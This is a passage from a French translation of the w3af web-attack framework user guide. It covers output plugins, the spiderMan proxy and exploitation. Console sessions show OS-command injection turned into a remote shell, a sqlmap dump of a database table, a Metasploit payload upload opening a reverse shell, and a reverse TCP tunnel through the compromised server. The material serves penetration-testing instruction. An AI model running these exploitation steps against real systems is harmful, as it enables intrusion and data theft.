class="P43">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T8">ls </span></p><p class="P45">vulnerable.php  </p><p class="P45">vulnerable2.php  </p><p class="P45">w3afAgentClient.log  </p><p class="P43">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T8">endInteraction </span></p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">exit </span></p><p class="P45">spawned a remote shell today?  </p><p class="P43">$  </p><p class="P43"> </p><h2 class="Heading2"><a name="La_sortie" />La sortie</h2><p class="P34">Toutes les sorties de w3af sont gérées par les plugins output. Chaque plugin output va écrire dans un format différent (txt, html, etc.), par exemple; le plugin textFile écrit toutes les sorties dans le fichier output-w3af.txt par défaut. La configuration de ces plugins se fait comme pour les autres plugins vus précédemment: </p><p class="Textbody"> </p><p class="P45"><span class="T3">$</span> ./w3af_console</p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set verbose True</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> back</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P45"><span class="T3">w3af/plugins/output/config:console&gt;&gt;&gt;</span> set verbose False</p><p class="P45"><span class="T3">w3af/plugins/output/config:console&gt;&gt;&gt;</span> back</p><p class="Textbody"> </p><p class="P34"><span class="T7">Cela va configurer le plugin textFile pour sortir tous les messages, incluant les informations de débogage (voir “</span><span class="T5">set verbose True</span><span class="T7">”) vers le fichier </span><span class="T5">“output-w3af.txt”. </span><span class="T7">Voici un exemple du fichier de sortie:</span></p><p class="P36"> </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Exiting setOutputPlugins()  </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Called w3afCore.start()  </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - xUrllib ] Called buildOpeners  </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: The connection manager has 0 active connections.  </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: added one connection, len(self._hostmap["localhost"]): 1 </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - httplib ] DNS response from DNS server for domain: localhost  </p><p class="P45">[ Sun Sep 14 17:36:09 2008 - debug - xUrllib ] GET http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 returned HTTP code "200"  </p><p class="P45"> </p><p class="P19">Les plugins output traitent également la journalisation des requêtes et réponses HTTP, chaque plugin traite ces données d'une manière différente, par exemple; le plugin textFile écrit les requêtes et réponses dans un fichier, alors que le plugin htmlFile ignore les données et ne fait simplement rien avec celles-ci. Un exemple d'un log HTTP écrit par textFile: </p><p class="P18"> </p><p class="P45">==========Request 4 - Sun Sep 14 17:36:12 2008==============  </p><p class="P45">GET http://localhost/w3af/osCommanding/vulnerable.php?command=+ping+-c+4+localhost HTTP/1.1  </p><p class="P45">Host: localhost  </p><p class="P45">Accept-encoding: identity  </p><p class="P45">Accept: */*  </p><p class="P45">User-agent: w3af.sourceforge.net  </p><p class="P45"> </p><p class="P45"> </p><p class="P45">==========Response 4 - Sun Sep 14 17:36:12 2008==============  </p><p class="P45">HTTP/1.1 200 OK  </p><p class="P45">date: Sun, 14 Sep 2008 20:36:09 GMT  </p><p class="P45">transfer-encoding: chunked  </p><p class="P45">x-powered-by: PHP/5.2.4-2ubuntu5.3  </p><p class="P45">content-type: text/html  </p><p class="P45">server: Apache/2.2.8 (Ubuntu) mod_python/3.3.1 Python/2.5.2 PHP/5.2.4-2ubuntu5.3 with Suhosin-Patch  </p><p class="P45"> </p><p class="P45">PING localhost (127.0.0.1) 56(84) bytes of data.  </p><p class="P45">64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.024 ms  </p><p class="P45">64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.035 ms  </p><p class="P45">64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.037 ms  </p><p class="P45">64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.037 ms </p><p class="P45"> </p><p class="P45">--- localhost ping statistics ---  </p><p class="P45">4 packets transmitted, 4 received, 0% packet loss, time 2999ms  </p><p class="P45">rtt min/avg/max/mdev = 0.024/0.033/0.037/0.006 ms  </p><p class="P45"> </p><p class="P45">============================================================= </p><p class="P45"> </p><p class="P19">Juste au cas où cela vous inquiéterait; tous les messages envoyés par les plugins et le framework sont envoyés à TOUS les plugins activés. Ainsi si vous avez activé les plugins output textFile et htmlFile, les deux journaliseront une vulnérabilité trouvée par un plugin audit. </p><p class="P18"> </p><h2 class="Heading2"><a name="Sites_complexes" />Sites complexes</h2><p class="P34">Certains sites utilisent des objets embarqués, comme des applets java et macromedia flash, que le navigateur rend à l'utilisateur. Du fait de l'impossibilité du framework d'obtenir des informations à partir de ces objets, un script appelé spiderMan fur créé. Ce script exécute un proxy HTTP permettant à l'utilisateur de naviguer sur le site cible à travers celui-ci; pendant ce temps le plugin va extraire des informations des requêtes et réponses. </p><p class="P34">Un exemple simple va clarifier ceci; supposons que w3af audite un site et ne parvienne pas à trouver des liens sur la page principale. Après une interprétation plus minutieuse des résultats par l'utilisateur, il apparait que la page principale contient un menu constitué par une applet Java où toutes les autres sections sont liées. L'utilisateur lance w3af une nouvelle fois et active maintenant le plugin spiderMan, visite le site manuellement en utilisant son fureteur favori et le proxy spiderman. Quand l'utilisateur a terminé sa navigation, w3af va continuer avec tout le travail difficile d'audit. </p><p class="P34">Le plugin spiderMan peut être utilisé quand du JavaScript, Flash, des applets Java ou toute autre technologie côté client est présente. </p><p class="Textbody">Voici un exemple d'exécution du plugin spiderMan: </p><p class="Textbody"> </p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery spiderMan</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://localhost/w3af/fileUpload/</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P39">spiderMan proxy is running on 127.0.0.1:44444 .  </p><p class="P39">Please configure your browser to use these proxy settings and navigate the target site. To exit spiderMan plugin please navigate to http://127.7.7.7/spiderMan?terminate .  </p><p class="P39"> </p><p class="P7">Maintenant l'utilisateur configure le navigateur pour utiliser le proxy  127.0.0.1:44444 et visiter le site cible, après celà, il visite <span class="T6">“</span><a href="http://127.7.7.7/spiderMan?terminate"><span class="T6">http://127.7.7.7/spiderMan?terminate</span></a><span class="T6">” et termine le spiderMan. Le résultat est aiché:</span></p><p class="P39"> </p><p class="P39">New URL found by discovery: http://localhost/w3af/test </p><p class="P39">New URL found by discovery: http://localhost/favicon.ico </p><p class="P39">New URL found by discovery: http://localhost/w3af/ </p><p class="P39">New URL found by discovery: http://localhost/w3af/img/w3af.png </p><p class="P39">New URL found by discovery: http://localhost/w3af/xss-forms/test-forms.html </p><p class="P39">New URL found by discovery: http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P39">The list of found URLs is: </p><p class="P39">- http://localhost/w3af/fileUpload/ </p><p class="P39">- http://localhost/w3af/test </p><p class="P39">- http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P39">- http://localhost/w3af/ </p><p class="P39">- http://localhost/w3af/img/w3af.png </p><p class="P39">- http://localhost/w3af/xss-forms/test-forms.html </p><p class="P39">- http://localhost/w3af/fileUpload/uploader.php </p><p class="P39">- http://localhost/favicon.ico </p><p class="P39">Found 8 URLs and 8 different points of injection. </p><p class="P39">The list of Fuzzable requests is: </p><p class="P39">- http://localhost/w3af/fileUpload/ | Method: GET </p><p class="P39">- http://localhost/w3af/fileUpload/uploader.php | Method: POST | Parameters: (MAX_FILE_SIZE,uploadedfile) </p><p class="P39">- http://localhost/w3af/test | Method: GET </p><p class="P39">- http://localhost/favicon.ico | Method: GET </p><p class="P39">- http://localhost/w3af/ | Method: GET </p><p class="P39">- http://localhost/w3af/img/w3af.png | Method: GET </p><p class="P39">- http://localhost/w3af/xss-forms/test-forms.html | Method: GET </p><p class="P39">- http://localhost/w3af/xss-forms/dataReceptor.php | Method: POST | Parameters: (user,firstname)</p><p class="P39">Starting sqli plugin execution. </p><p class="P43">w3af&gt;&gt;&gt; </p><h2 class="Heading2"><a name="Exploitation" />Exploitation</h2><p class="P34">Deux manières d'exploiter une vulnérabilité existent; la première utilise les vulnérabilités trouvées durant la phase d'audit, et la seconde, appelée fastexploit, nécessite que l'utilisateur entre les paramètres liés à la vulnérabilité. </p><p class="P34"> </p><p class="P34">Voyons un exemple de la première manière d'exploiter une vulnérabilité avec w3af: </p><p class="P38"> </p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">plugins </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">audit osCommanding </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">target </span></p><p class="P43">w3af/config:target&gt;&gt;&gt;<span class="T8">set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </span></p><p class="P43">w3af/config:target&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">start </span></p><p class="P45">Found 1 URLs and 1 different points of injection.  </p><p class="P45">The list of URLs is:  </p><p class="P45">- http://localhost/w3af/osCommanding/vulnerable.php  </p><p class="P45">The list of fuzzable requests is:  </p><p class="P45">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)  </p><p class="P45">Starting osCommanding plugin execution.  </p><p class="P45">OS Commanding was found at: "http://localhost/w3af/osCommanding/vulnerable.php", using HTTP method GET. The sent data was: "command=+ping+-c+9+localhost". The vulnerability was found in the request with id 5.  </p><p class="P45">Finished scanning process.  </p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">exploit </span></p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">exploit osCommandingShell </span></p><p class="P45">osCommandingShell exploit plugin is starting.  </p><p class="P45">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P45">Vulnerability successfully exploited. This is a list of available shells: </p><p class="P45">- [0] &lt;osCommandingShell object (ruser: "www-data" | rsystem: "Linux brick 2.6.24-19-generic i686 GNU/Linux")&gt;  </p><p class="P45">Please use the interact command to interact with the shell objects.  </p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">interact 0 </span></p><p class="P45">Execute "endInteraction" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P43">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T8">ls </span></p><p class="P45">vulnerable.php  </p><p class="P45">vulnerable2.php  </p><p class="P45">w3afAgentClient.log  </p><p class="P43">w3af/exploit/osCommandingShell-0&gt;&gt;&gt;<span class="T8">endInteraction </span></p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt; </p><p class="P44"> </p><p class="P54">La deuxième manière est d'utiliser fastexploit. Cette méthode doit être utilisée quand l'utilisateur a trouvé une vulnérabilité manuellement et souhaite l'exploiter en utilisant le framework. Voici un exemple d'utilisation de fastexploit: </p><p class="P54"> </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit</p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit config sqlmap</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt; </span>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set injvar id</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set data id=1</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> back</p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> fastexploit sqlmap</p><p class="P49">sqlmap coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch &lt;daniele.bellucci@gmail.com&gt; </p><p class="P49">SQL injection could be verified, trying to create the DB driver. </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P49"><span class="T3">w3af/exploit/sqlmap&gt;&gt;&gt;</span> dump agenda w3af_test</p><p class="P49">Database: w3af_test </p><p class="P49">Table: agenda </p><p class="P49">[2 entries]</p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P49">| direccion     | id | nombre | telefono | email           |</p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P49">| direccion 123 | 1  | apr    | 52365786 | acho@c.com      |</p><p class="P49">| direccion 333 | 2  | vico   | 47998123 | vTro@c.com      |</p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P50">w3af/exploit/sqlmap&gt;&gt;&gt; </p><h3 class="Heading3"><a name="Techniques_d_27exploitation_avanc_C3_A9es" />Techniques d'exploitation avancées</h3><p class="P25">Le framework implémente deux techniques d'exploitation très poussées qui permettent à l'utilisateur d'élever ses privilèges sur le réseau distant. Ces deux techniques sont mises en oeuvre uen fois que le framework est capable d'exécuter des commandes système à distance, c'est le cas (par exemple) pour les plugins d'attaque osCommanding, remoteFileIncludeShell et davShell. Ces techniques d'exploitation sont: </p><ul style="margin-left:1.25cm;"><li class="P72" style="margin-left:0cm;"><p class="P72" style="margin-left:0.25cm;">Virtual daemon, vous permet d'utiliser des payloads Metasploit pour exploiter le serveur qui héberge une application web vulnérable. </p></li><li class="P72" style="margin-left:0cm;"><p class="P72" style="margin-left:0.25cm;">w3afAgent, qui crée un tunnel entre le serveur compromis et w3af, permettant à l'utilisateur de router les connexions TCP via le serveur distant. </p></li></ul><p class="P25">Toutes les deux sont simples à employer en utilisant ce guide. Ces fonctionnalités sont en plein chantier de développement et ne sont aucunement stables; utilisez-les à vos risques et périls. </p><p class="P25"> </p><p class="P25"> </p><h3 class="P28"><a name="Virtual_daemon" />Virtual daemon</h3><p class="P25">Comme dit précédemment, cette fonctionnalité vous permet d'utiliser les charges utiles du Metasploit pour exploiter le serveur hébergeant uen application web vulnérable. Pour utiliser cette fonctionnalité, vous devez avoir une installation fonctionnelle de la version 3.0 ou supérieure du Framework Metasploit. Vous pouvez l'obtenir gratuitement sur <a href="http://www.metasploit.com/">www.metasploit.com</a>, l'installation et la configuration du MSF sortant du cadre de ce document.</p><p class="P25">Pour être à même d'utiliser virtual daemon; vous allez devoir lancer la commande suivante afin de copier le module metasploit w3af dans le répertoire du MSF: </p><p class="P49">./w3af_console -i /home/jdoe/tools/msf/ </p><p class="P49"> </p><p class="P27">Où “<span class="T4">/home/jdoe/tools/msf/</span><span class="T6">” est le répertoire où l'utilisateur “jdoe” a installé le  Metasploit. Au cas où cela vous intéresse, c'est simplement un raccourci fantaisiste pour</span> “<span class="T4">cp core/controllers/vdaemon/w3af_vdaemon.rb </span><span class="T4">/home/user/tools/msf/modules/exploits/unix/misc/</span>”.</p><p class="P27">Une fois celà fait, l'utilisateur peut commencer à utiliser la fonction virtual daemon. Avant de passer à un exemple d'utilisation de cette fonctionnalité, nous allosn faire un petit résumé des étapes qui vont se dérouler pendant l'exploitation: </p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">w3af déniche une vulnérabilité qui permet l'exécution de commande à distance </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">l'utilisateur exploite la vulnérabilité et lance virtual daemon </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">L'utilisateur lance le framework Metasploit </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">L'utilisateur configure le module w3af dans le MSF et l'exécute </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">Le module w3af, au sein du MSF, va se connecter au virtual dameon en écoute sur le localhost </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">Le MSF va envoyer le payload sélectionné par l'utilisateur au virtual daemon </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">Le virtual daemon va créer un fichier PE (exécutable portable) ou un ELF(executable and linkable format), en fonction du système d'exploitation distant, et en utilisant la vulnérabilité exploitée; il va téléverser et exécuter la charge utile sur le serveur distant </p></li><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">Le processus de téléversement sur le serveur cible dépend du système d'exploitation cible, les privilèges de l'utilisateur exécutant w3af et du système d'exploitation local, mais dans la plupart des cas il se passe ceci: </p></li></ol><ul style="margin-left:1.25cm;"><li class="P83" style="margin-left:1.25cm;"><p class="P83" style="margin-left:0.25cm;">w3af envoie un petit exécutable au serveur distant pour réaliser un scan d'extrusion. </p></li><li class="P83" style="margin-left:1.25cm;"><p class="P83" style="margin-left:0.25cm;">w3af renifle l'interface configurée ( misc-settings -&gt; interface ) pour les paquets qui arrive sur les ports voulus afin de vérifier les règles de sortie du pare-feu sur le réseau distant </p></li><li class="P85" style="margin-left:1.25cm;"><p class="P85" style="margin-left:0.25cm;"><span class="T6">Si un port TCP est trouvé comme étant autorisé sur le pare-feu distant; w3af va essayer de lancer un serveur sur ce port et d'initialiser une connexion inverse depuis l'hôte compromis dans le but de télécharger le fichier PE/ELF généré</span>. Si aucun port TCP n'est autorisé; w3af enverra le fichier PE/ELF au serveur distant en utilisant plusieurs appels à la commande “echo”, ce qui est plus lent, mais devrait toujours fonctionner sagissant d'une méthode de transfert dans la bande.</p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P73" style="margin-left:0cm;"><p class="P73" style="margin-left:0.25cm;">    La charge utile s'exécute sur le serveur distant et avec les doigts croisés se connecte au framework Metasploit, qui va traiter le reste de l'exploitation.</p></li></ol><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P74" style="margin-left:0cm;"><p class="P74" style="margin-left:0.25cm;"> </p></li></ol><p class="P25">Maintenant que l'on a vu la théorie, passons à un exemple pratique: </p><p class="P49"><span class="T3">$</span> ./w3af_console </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P49">Enabled audit plugins:  </p><p class="P49">osCommanding  </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> target </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://172.16.1.128/os.php?cmd=f00 </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> start </p><p class="P49">The list of found URLs is:  </p><p class="P49">- http://172.16.1.128/os.php  </p><p class="P49">Found 1 URLs and 1 different points of injection.  </p><p class="P49">The list of Fuzzable requests is:  </p><p class="P49">- http://172.16.1.128/os.php | Method: GET | Parameters: (cmd)  </p><p class="P49">Starting osCommanding plugin execution.  </p><p class="P49">OS Commanding was found at: http://172.16.1.128/os.php . Using method: GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The vulnerability was found in the request with id 7.  </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit </p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P49">osCommanding exploit plugin is starting.  </p><p class="P49">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P49">Vulnerability successfully exploited.  </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T3">start vdaemon </span></p><p class="P49">Virtual daemon service is running on port 9091, use metasploit's w3af_vdaemon module to exploit it.  </p><p class="P50">w3af/exploit/osCommandingShell&gt;&gt;&gt;  </p><p class="P50"> </p><p class="P27">Rien de nouveau sous le soleil pour l'instant, nous avons seulement introduit la nouvelle commande “<span class="T5">start vdaemon</span>”. Avec ce lancement de w3af, nous avons couverts les points 1. et 2. de la théorie.</p><p class="P27">La prochaine étape est de configurer le module MSF et de le lancer; nous allons utiliser l'interface web “msfweb” du Metasploit pour ce faire. La première étape est de cliquer sur le bouton “Exploit” du menu principal, une petite fenêtre apparait, où vous pouvez chercher <span class="T1">w3af</span> puis sélectionner l'exploit nommé “w3af virtual daemon exploit”. Certains points importants à garder en tête lors de la configuration du module de démon virtuel de l'agent w3af dans le MSF:</p><ul style="margin-left:1.25cm;"><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">La cible (target) est bien entendu le système d'exploitation distant que vous exploitez </p></li><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">Les payloads VNC ne semblent pas fonctionner </p></li><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">Le paramètre RHOST indique l'adresse IP du serveur que vous exploitez </p></li><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">LHOST est votre adresse IP publique </p></li><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">LPORT est un port auquel le serveur web distant peut se connecter (dans le cas de l'utilisation de payloads reverse connect) ou auquel vous pouvez vous connecter (en utilisant des payloads bind) </p></li><li class="P75" style="margin-left:0cm;"><p class="P75" style="margin-left:0.25cm;">Le module w3af à l'intérieur du Metasploit va se connecter à localhost:9091 et se charge de tous les transferts de payload, ces paramètres ne peuvent être modifiés, et ne doivent pas être confondus avec RHOST/LHOST et LPORT </p></li></ul><p class="P25"> </p><p class="P25">Une fois que ceci a été configuré, nous pouvons cliquer sur “Launch exploit” pour lancer le processus, voici ce que nous allons voir dans la console: </p><p class="P25"> </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">The extrusion test failed, no reverse connect transfer methods can be used. Trying inband echo transfer method.  </p><p class="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P49">Successfully transfered the MSF payload to the remote server.  </p><p class="P49">Successfully executed the MSF payload on the remote server.  </p><p class="P49"> </p><p class="P25">Les derniers messages sont affichés quand vous exécutez w3af en tant qu'utilisateur normal, la raison est simple; quand vous exécutez w3af en tant que simple utilisateur, vous ne pouvez pas renifler et donc pas réaliser un scan d'extrusion. Un scan d'extrusion réussi ressemble à ça: </p><p class="P25"> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">ExtrusionServer listening on interface: eth1 </p><p class="P49">Finished extrusion scan.  </p><p class="P49">The remote host: "172.10.10.1" can connect to w3af with these ports: </p><p class="P49">- 25/TCP  </p><p class="P49">- 80/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">- 53/UDP  </p><p class="P49">- 69/UDP  </p><p class="P49">- 139/UDP  </p><p class="P49">- 1025/UDP  </p><p class="P49">The following ports are not bound to a local process and can be used by w3af:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P26">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P26"> </p><p class="P25">Et si on jete un oeil à l'interface web Metasploit, nous allons découvrir quelquechose de bien plus intéressant: </p><p class="P26"> </p><p class="P49">[*] Started reverse handler  </p><p class="P49">[*] The remote IP address is: 172.16.1.128  </p><p class="P49">[*] Using remote IP address to create payloads.  </p><p class="P49">[*] Sent payload to vdaemon.  </p><p class="P49">[*] The estimated time to wait for the extrusion scan to complete is: 1 seconds.  </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] The estimated time to wait for PE/ELF transfer is: 8 seconds.  </p><p class="P49">[*] Waiting...  </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] Going to wait for 27 seconds (waiting for crontab/at to execute payload).  </p><p class="P49">[*] The session could start before the handler, so please *be patient*.  </p><p class="P49">[*] Command shell session 1 opened (172.16.1.1:4444 -&gt; 172.16.1.128:1047) </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] Starting handler  </p><ol style="margin-left:1.25cm;list-style-type:upper-roman; "><li class="P77" style="margin-left:0cm;"><p class="P77" style="margin-left:0.25cm;">Microsoft Windows 2000 [Version 5.00.2195]  </p><p class="P77" style="margin-left:0.25cm;">(C) Copyright 1985-2000 Microsoft Corp. </p><p class="P86" style="margin-left:0.25cm;"> </p><p class="P77" style="margin-left:0.25cm;">C:\WINNT\system32&gt; </p></li></ol><p class="P25"> </p><p class="P25">Bingo! L'utilisateur a maintenant un shell interactif avec les privilèges de l'utilisateur faisant tourner le serveur web, qui peut être utilisé sans restrictions, vous pouvez même fermer w3af et continuer à travailler directement depuis le shell Metasploit. </p><p class="P25"> </p><h3 class="P29"><a name="w3afAgent" />w3afAgent</h3><p class="P25">Comme vu dans un épisode précédent, cette fonctionnalité vous permet de créer un tunnel inversé qui va router les connexions TCP via le serveur compromis. Contriarement à virtual daemon, cette fonctionnalité est prête à l'emploi et ne nécessite aucun logiciel complémentaire. Avant de voir un exemple d'utilisation, je vous propose un peu de théorie (si si y'en faut) sur les étapes de l'exploitation: </p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">w3af déniche une vulnérabilité qui permet une exécution de commande à distance (brave petit!) </p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">Le vayant utilisateur exploite triomphalement cette vulnérabilité et démarre w3afAgent </p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">w3af réalise un scan d'extrusion en envoyant un petit exécutable au serveur distant. Cet exécutable, dans sa grande bonté, se connecte à w3af et permet au framework d'identifier les règles de sortie du pare-feu (c'est ce qu'on <span class="T9">appele</span> “<span class="T1">se</span> faire le mur”) sur le réseau distant.</p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">w3afAgent Manager va envoyer un w3afAgentClient au serveur distant. Le procédé de téléversement de fichier sur le serveur distant dépend <span class="T1">(non pas de l'âge du capitanie, mais)</span> du système d'exploitation distant, des privilèges de l'utilisateur exécutant w3af et du système d'exploitation local; mais quand tout va pour le mieux dans le meilleur des mondes:</p></li></ol><ul style="margin-left:1.25cm;"><li class="P84" style="margin-left:1.25cm;"><p class="P84" style="margin-left:0.25cm;">w3af réutilise les informations glanées à partir du premier scan d'extrusion, qui a té réalisé à l'étape 3 afin de savoir quel port il peut utiliser pour écouter en attente de connexions du serveur dénudé. </p></li><li class="P84" style="margin-left:1.25cm;"><p class="P84" style="margin-left:0.25cm;">Si un port TCP est trouvé comme autorisé dans le pare-feu distant, w3af va essayer de faire tourner un serveur sur ce port et d'établir une connexion inversée depuis le serveur compromis afin de télécharger le fichier PE/ELF généré. Si aucun port TCP n'est autorisé, w3af va envoyé le fichier PE/ELF au serveur distant via plusieurs appels à la sacro-sainte commande “echo”, ce qui est plus lent, mais devrait toujours fonctionner du fait qu'il s'agit d'une méthode de transfert en bande organisée. </p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">w3afAgent Manager démarre le w3afAgentServer qui va se lier à localhost:1080 (qui va être utilisé par l'utilisateur w3af) et à l'interface configurée dans w3af (misc-settings-&gt;interface) sur le port découvert à l'étape 3. </p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">Le w3afAgentClient se connecte au w3afAgentServer (tu me suis?), créant avec grand brio le tunnel sous la chemise <span class="T1">(-erreur de traduction-)</span></p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">l'utilisateur configure le proxy écoutant localhost:1080 dans son fureteur préféré </p></li><li class="P76" style="margin-left:0cm;"><p class="P76" style="margin-left:0.25cm;">Quand le programme se connecte au proxy sock, toutes les connexions sortantes sont routées à travers le serveur compromis (que demande le peuple!?) </p></li></ol><p class="P25"> </p><p class="P25">Maintenant que je vous ai barbé avec la théorie, utilisons nos petits doigts potelés:</p><p class="P49"><span class="T3">$</span> ./w3af_console</p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P49">Enabled audit plugins:  </p><p class="P49">osCommanding  </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P49"><span 